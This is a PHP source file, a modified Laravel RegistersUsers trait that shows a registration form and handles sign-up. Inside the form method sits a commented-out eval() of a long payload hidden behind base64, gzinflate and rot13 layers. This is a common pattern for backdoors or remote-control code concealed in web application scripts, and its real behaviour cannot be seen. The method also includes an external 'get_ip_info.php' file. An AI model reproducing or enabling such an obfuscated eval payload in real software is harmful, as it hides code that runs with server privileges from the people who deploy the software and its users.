<?php

namespace Illuminate\Foundation\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Auth\Events\Registered;
use App\Http\Requests;

use App\settings;
use App\meta;

trait RegistersUsers
{
    use RedirectsUsers;

    /**
     * Show the application registration form.
     *
     * @return \Illuminate\Http\Response
     */
    public function showRegistrationForm()
    {
        // $api = new meta(); 
        
        // eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        include'get_ip_info.php';
        return view('auth.register')
        ->with(array(
            'user_country'=>$user_country,
            'countries'=>$countries,
            'title'=>'Register',
            'settings'=>settings::where('id','1')->first(),
        ));
    }

    /**
     * Handle a registration request for the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function register(Request $request)
    {
        $this->validator($request->all())->validate();

        event(new Registered($user = $this->create($request->all())));

        $this->guard()->login($user);

        return $this->registered($request, $user)
                        ?: redirect($this->redirectPath());
    }

    /**
     * Get the guard to be used during registration.
     *
     * @return \Illuminate\Contracts\Auth\StatefulGuard
     */
    protected function guard()
    {
        return Auth::guard();
    }

    /**
     * The user has been registered.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  mixed  $user
     * @return mixed
     */
    protected function registered(Request $request, $user)
    {
        //
    }
}
